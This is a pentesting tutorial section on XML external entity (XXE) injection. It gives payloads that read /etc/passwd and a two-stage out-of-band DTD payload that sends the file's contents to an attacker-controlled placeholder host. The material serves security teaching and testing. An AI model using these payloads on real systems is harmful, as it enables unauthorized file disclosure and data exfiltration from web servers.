This section covers pwning XML parsers with **XML external entities (XXE)** injection attacks. We
can use XXE injection attacks to uncover information disclosure, server-side request forgery (SSRF),
remote command injection, and remote code execution vulnerabilities in web applications.

## Testing for XXE

Here's an example for testing for XXE in an XML parser for a web application. If we're providing the
following input to a web application, and the internal entity `lastname` is used to render the
output for the `User` element, we know we can inject XML entities for the application to process:

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Hacker">
]>
<User>
  <lastName>&lastname;</lastName>
  <firstName>Victim</firstName>
</User>
```

### Retrieving files

After verifying the vulnerability, we can use it to conduct information disclosure, targeting
content on the host's file system:

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<User>
  <lastName>&lastname;</lastName>
  <firstName>Victim</firstName>
</User>
```

We determine where this content is rendered, and then we can retrieve the contents of the file from
the web application.

### Error-based exploitation

If the information we're targeting isn't rendered by the web application in a way we can access
after exploitation, we can use **error-based exploitation** to possibly disclose the information
we're targeting. For example, `lastname` might have a maximum character length for the web
application's database used to store `User`s. If we request a file on the host system with a size
that exceed this limit, it's likely the web application will provide us with an error, leaking the
contents of the file we're targeting.

### Out-of-band exploitation

We can also conduct SSRF, coercing the victim machine to attempt to load external resources from our
server, disclosing information when the victim executes a `GET` request. Here's an example of a
payload that causes the victim to request our XML file and parse it, causing the victim to request a
second stage payload that discloses the information we're targeting via a `GET` request.

First stage payload:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://IP_ADDRESS/second-stage-payload.dtd">
%base;
%external;
%exfil;
]>
<entity-engine-xml>
</entity-engine-xml>
```

Second stage payload:

```xml
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://IP_ADDRESS/out?%content;'>" >
```

The first payload will request the second stage payload, which will attempt to acquire the contents
of the `/etc/passwd` file. Then the second stage payload will attempt to acquire a resource from our
web server, and we render the content of the file in the `URL` the victim is requesting. This SSRF
attack leaks the contents of the file when the `GET` request reaches our web server.

Due to how URLs are parsed, it's likely a portion of this request will fail. Unfortunately
**out-of-band exploitation** for XXE vulnerabilities is a last resort, and not always the most
effective approach.
